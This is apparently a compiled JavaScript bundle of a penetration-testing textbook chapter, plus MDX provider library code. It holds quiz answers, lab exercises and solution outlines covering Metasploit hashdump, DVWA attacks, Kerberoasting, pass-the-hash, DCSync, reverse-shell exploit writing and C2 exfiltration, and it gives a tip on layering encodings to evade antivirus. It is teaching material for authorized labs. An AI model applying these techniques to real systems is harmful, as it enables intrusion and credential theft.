        children: "Answer"
      }), "\n**B) Extracts NTLM password hashes from the SAM database** — `hashdump` reads the Windows SAM registry hive to extract user account password hashes, which can then be cracked offline.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "10. When a penetration tester discovers a critical vulnerability during testing, the ethical obligation is to:"
      })
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "A) Exploit it silently and keep it secret until the report\nB) Immediately stop testing and notify the point of contact per the Rules of Engagement\nC) Post the exploit code on GitHub immediately\nD) Ignore it and continue with the test plan"
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Answer"
      }), "\n**B) Immediately notify the point of contact per the RoE** — Critical findings (especially those involving active exploitation or data exposure) should be reported immediately so the client can take emergency protective measures, not wait for the final report.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-takeaways",
      children: "Practical Takeaways"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Automate reconnaissance"
        }), " — Use the ReconToolkit TypeScript code to build automated recon pipelines that feed findings directly into your exploitation workflow."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Validate before exploiting"
        }), " — Always verify that a vulnerability is truly exploitable in the target environment. Use the ExploitValidator's ", (0,jsx_runtime.jsx)(_components.code, {
          children: "checkExploitability"
        }), " method to reduce false positives."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Payload encoding matters"
        }), " — Basic encodings (Base64, hex, XOR) can bypass simple signature-based AV. Combine multiple layers for more effective evasion."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Document every step"
        }), " — The Metasploit sequence diagram shows why proper documentation is critical: each exploitation chain must be reproducible for the final report."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Always operate under authorization"
        }), " — Never run reconnaissance or exploitation tools without written authorization. The Rules of Engagement document is your legal protection."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Post-exploitation is where real impact is measured"
        }), " — Getting initial access is only half the battle; privilege escalation, lateral movement, and data exfiltration demonstrate the true risk."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Report with context"
        }), " — A good pentest report doesn't just list vulnerabilities; it explains business impact, maps findings to frameworks (OWASP, MITRE ATT&CK), and provides clear, actionable remediation steps."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "exercises",
      children: "Exercises"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "review-questions",
      children: "Review Questions"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "List the six phases of the penetration testing lifecycle in order."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Planning and Reconnaissance, 2) Scanning, 3) Gaining Access (Exploitation), 4) Maintaining Access, 5) Analysis, 6) Reporting.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between a vulnerability scan and a penetration test?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nA vulnerability scan is automated and identifies known CVEs and misconfigurations. A penetration test is manual plus automated, actively exploits vulnerabilities to prove business impact, and includes chained attacks and business logic testing.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the concept of pivoting in a penetration test and why it matters."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nPivoting uses a compromised host as a relay to access otherwise unreachable internal systems. It matters because networks are segmented — pivoting demonstrates how a single compromised host can lead to internal network compromise.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What are the three main components of the Rules of Engagement document?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Scope (in-scope and out-of-scope targets), 2) Authorization (signed approval and emergency contacts), 3) Constraints (allowed techniques, testing schedule, data handling rules).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between privilege escalation and lateral movement?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nPrivilege escalation: gaining higher privileges on the same host (e.g., user to root). Lateral movement: moving from one host to another across the network. Both are required for a full attack chain.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "6",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "How does BloodHound find attack paths in Active Directory?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nBloodHound collects AD data (users, groups, computers, sessions, ACLs) and maps relationships as a graph. It finds attack paths via group memberships, ACL permissions, session data, and Kerberos delegation, then computes the shortest path to a target like Domain Admin.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "practical-exercises",
      children: "Practical Exercises"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Build Your Pentesting Lab:"
        }), " Using the lab setup guide from Chapter 1 (Section 7), set up Kali Linux and Metasploitable 2. Perform a full penetration test:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Reconnaissance: nmap -sV -p- against the target"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Enumeration: Identify all services running"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Exploitation: Exploit at least 3 vulnerabilities (vsFTPd, UnrealIRCd, Samba)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Post-Exploitation: Get a Meterpreter shell, dump password hashes"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Document every step with screenshots"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nRun a full port scan to identify services. Exploit vsFTPd 2.3.4 backdoor, UnrealIRCd backdoor, and Samba usermap script via the Metasploit framework. After gaining access, obtain a shell and dump password hashes. Document each command with timestamps and screenshots for the report.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Web Application Penetration Test:"
        }), " Set up DVWA (Damn Vulnerable Web Application) on a target VM. Perform:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "SQL injection (all types: in-band, blind, out-of-band)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "XSS (reflected, stored, DOM-based)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "CSRF attack"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "File inclusion (LFI/RFI)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Command injection\nDocument findings with OWASP Top 10 mappings and remediation steps."
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nTest SQL injection with boolean and time-based techniques. Test reflected and stored XSS. Craft a CSRF proof-of-concept HTML form. Exploit LFI to read system files. Map each finding to OWASP Top 10 categories and provide clear remediation steps such as parameterized queries and output encoding.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Active Directory Attack Lab:"
        }), " Set up a Windows Domain Controller + Windows 10 workstation. From Kali:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Enumerate AD: ldapsearch, BloodHound"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Kerberoast a service account"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "AS-REP roast a user with pre-auth disabled"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Pass-the-hash to move laterally"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "DCSync to dump all domain hashes\nDocument the full attack chain with MITRE ATT&CK mappings."
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nUse Impacket tools for Kerberoasting, AS-REP roasting, pass-the-hash, and DCSync attacks. Use BloodHound for AD enumeration and attack path discovery. Map each technique to MITRE ATT&CK identifiers (T1558.003, T1558.004, T1550.002, T1003.006) in the documentation.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Report Writing Exercise:"
        }), " Write a professional penetration test report for a fictional web application. Include:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Executive summary (non-technical)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Technical findings with OWASP mapping"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Risk ratings (CVSS 3.1 scores)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Proof of concept for each finding"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Remediation recommendations"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Screenshots and code blocks"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nWrite a 1-2 page executive summary describing overall risk posture. Create a findings table with vulnerability name, OWASP category, CVSS score, affected endpoint, proof of concept, and remediation. Include screenshots of exploitation steps and code snippets showing both vulnerable and fixed implementations.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "challenge-problems",
      children: "Challenge Problems"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Boot-to-Root Challenge:"
        }), " Complete a vulnerable VM from VulnHub or Hack The Box (e.g., Kioptrix, Mr. Robot, or an easy HTB box). Document every step:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Reconnaissance methodology"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Exploitation chains"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Privilege escalation techniques"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Flags captured\nWrite a walkthrough suitable for a CTF writeup blog."
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nPerform initial recon with port scanning and directory enumeration. Exploit a web application vulnerability (e.g., WordPress plugin upload) to gain initial access. Escalate privileges using a misconfigured SUID binary. Capture the flag file and document each step with commands and output for a blog-style walkthrough.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Custom Exploit Development:"
        }), " Find a published CVE with a PoC available. Study the vulnerability. Write your own custom exploit in Python or TypeScript that:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Performs proper socket communication"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Delivers a custom payload (reverse shell)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Handles errors gracefully"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Works against the vulnerable target"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nStudy a publicly documented vulnerability. Write a Python script that opens a TCP socket to the target, sends a crafted payload that triggers the vulnerability, and delivers a callback payload. Implement try/catch error handling and socket timeouts. Test against a lab target to confirm the exploit works.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Purple Team Exercise:"
        }), " Work with a partner (or dual VMs). Red Team:\n", (0,jsx_runtime.jsxs)(_components.ul, {
          children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Deploy a C2 framework (Covenant, Sliver, or Empire)"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Establish persistence on a target"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Exfiltrate a \"flag\" file\nBlue Team:"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Deploy Sysmon + Wazuh/Elastic on the target"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Create detection rules for the C2 communication"
          }), "\n", (0,jsx_runtime.jsx)(_components.li, {
            children: "Detect and contain the breach\nDebrief: Compare red team actions vs blue team detections"
          }), "\n"]
        }), "\n"]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nRed team deploys a C2 implant via phishing, establishes persistence via scheduled task, and exfiltrates the flag via HTTP. Blue team uses Sysmon and a SIEM to detect process creation anomalies and outbound connections to unknown IPs. Create custom detection rules. Debrief to identify which actions were detected versus missed and tune rules accordingly.\n"]
    })]
  });
}
function MDXContent(props = {}) {
  const {wrapper: MDXLayout} = {
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return MDXLayout ? (0,jsx_runtime.jsx)(MDXLayout, {
    ...props,
    children: (0,jsx_runtime.jsx)(_createMdxContent, {
      ...props
    })
  }) : _createMdxContent(props);
}



/***/ },

/***/ 28453
(__unused_webpack___webpack_module__, __webpack_exports__, __webpack_require__) {

/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   R: () => (/* binding */ useMDXComponents),
/* harmony export */   x: () => (/* binding */ MDXProvider)
/* harmony export */ });
/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(96540);
/**
 * @import {MDXComponents} from 'mdx/types.js'
 * @import {Component, ReactElement, ReactNode} from 'react'
 */

/**
 * @callback MergeComponents
 *   Custom merge function.
 * @param {Readonly<MDXComponents>} currentComponents
 *   Current components from the context.
 * @returns {MDXComponents}
 *   Additional components.
 *
 * @typedef Props
 *   Configuration for `MDXProvider`.
 * @property {ReactNode | null | undefined} [children]
 *   Children (optional).
 * @property {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @property {boolean | null | undefined} [disableParentContext=false]
 *   Turn off outer component context (default: `false`).
 */



/** @type {Readonly<MDXComponents>} */
const emptyComponents = {}

const MDXContext = react__WEBPACK_IMPORTED_MODULE_0__.createContext(emptyComponents)

/**
 * Get current components from the MDX Context.
 *
 * @param {Readonly<MDXComponents> | MergeComponents | null | undefined} [components]
 *   Additional components to use or a function that creates them (optional).
 * @returns {MDXComponents}
 *   Current components.
 */
function useMDXComponents(components) {
  const contextComponents = react__WEBPACK_IMPORTED_MODULE_0__.useContext(MDXContext)

  // Memoize to avoid unnecessary top-level context changes
  return react__WEBPACK_IMPORTED_MODULE_0__.useMemo(
    function () {
      // Custom merge via a function prop
      if (typeof components === 'function') {
        return components(contextComponents)
      }

      return {...contextComponents, ...components}
    },
    [contextComponents, components]
  )
}

/**
 * Provider for MDX context.
 *
 * @param {Readonly<Props>} properties
 *   Properties.
 * @returns {ReactElement}
 *   Element.
 * @satisfies {Component}
 */
function MDXProvider(properties) {
  /** @type {Readonly<MDXComponents>} */
  let allComponents

  if (properties.disableParentContext) {
    allComponents =
      typeof properties.components === 'function'
        ? properties.components(emptyComponents)
        : properties.components || emptyComponents
  } else {
    allComponents = useMDXComponents(properties.components)
  }

  return react__WEBPACK_IMPORTED_MODULE_0__.createElement(
    MDXContext.Provider,
    {value: allComponents},
    properties.children
  )
}


/***/ }

}]);